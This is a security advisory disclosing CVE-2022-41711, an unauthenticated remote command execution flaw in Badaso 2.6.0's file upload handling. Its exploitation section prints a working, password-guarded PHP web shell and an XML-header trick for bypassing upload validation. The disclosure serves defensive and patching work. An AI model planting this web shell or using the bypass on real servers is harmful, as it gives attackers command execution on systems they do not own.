---
slug: advisories/harlow/
title: Badaso 2.6.0 - Remote Command Execution
authors: Carlos Bello
writer: cbello
codename: harlow
product: Badaso 2.6.0 - RCE
date: 2022-10-18 13:00 COT
cveid: CVE-2022-41711
severity: 10.0
description: Badaso 2.6.0    -    Remote Command Execution (RCE)
keywords: Fluid Attacks, Security, Vulnerabilities, Badaso, RCE
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | Badaso 2.6.0 - RCE                                                 |
| **Code name**         | [Harlow](https://en.wikipedia.org/wiki/Jack_Harlow)                |
| **Product**           | Badaso                                                             |
| **Affected versions** | Version 2.6.0                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2022-10-18                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Remote command execution                                                                                                    |
| **Rule**              | [004. Remote command execution](https://docs.fluidattacks.com/criteria/vulnerabilities/004)                                 |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H                                                                                |
| **CVSSv3 Base Score** | 10.0                                                                                                                        |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-41711](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41711)                                             |

## Description

Badaso version 2.6.0 allows an unauthenticated remote attacker to
execute arbitrary code remotely on the server. This is possible
because the application does not properly validate the data uploaded
by users.

## Vulnerability

This vulnerability occurs because the application does not correctly
validate files uploaded by users. Thanks to this, we uploaded a file
with malicious PHP code, instead of an image file.

## Exploitation

To exploit this vulnerability, the following file must be sent to the
server:

### exploit.php

```php
<?xml version="1.0" standalone="no"?>
<?php
    if($_POST && $_POST['password']==="AGSH635479302H235") {
        echo system($_POST['cmd']);
    }
?>
```

It is important to put an XML header before the malicious code to
bypass security controls.

## Evidence of exploitation

![RCE-badaso](https://user-images.githubusercontent.com/51862990/196501094-37997697-2346-42a6-891c-b2044cf8d0b8.gif)

![image](https://user-images.githubusercontent.com/51862990/196500837-06a8ce8a-3fff-42cc-b3b9-8aad023719f2.png)

## Our security policy

We have reserved the CVE-2022-41711 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Badaso 2.6.0

* Operating System: GNU/Linux

## Mitigation

An updated version of Badaso is available at the vendor page.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/uasoft-indonesia/badaso>

**Issue** <https://github.com/uasoft-indonesia/badaso/issues/802>

## Timeline

<time-lapse
  discovered="2022-10-05"
  contacted="2022-10-05"
  replied="2022-10-05"
  confirmed="2022-10-05"
  patched="2022-10-11"
  disclosure="2022-10-18">
</time-lapse>
